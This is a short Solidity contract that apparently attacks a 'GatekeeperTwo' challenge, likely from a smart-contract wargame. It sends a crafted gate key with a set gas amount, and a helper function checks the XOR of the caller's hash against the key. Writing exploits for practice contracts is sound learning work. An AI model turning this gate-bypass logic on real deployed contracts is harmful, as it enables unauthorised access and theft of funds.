pragma solidity ^0.6.0;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperAttack {
    function attack(address _address, bytes8 _gateKey, uint64 _gas) external {
        GatekeeperTwo(_address).enter{ gas: _gas }(_gateKey);
    }

    function test(bytes8 _gateKey) external view returns (uint64 right, uint64 left1, uint64 left2, uint64 left, bool res) {
      right = uint64(0) - 1;
      left1 = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
      left2 = uint64(_gateKey);
      left = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey);
      res = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1;
    }
}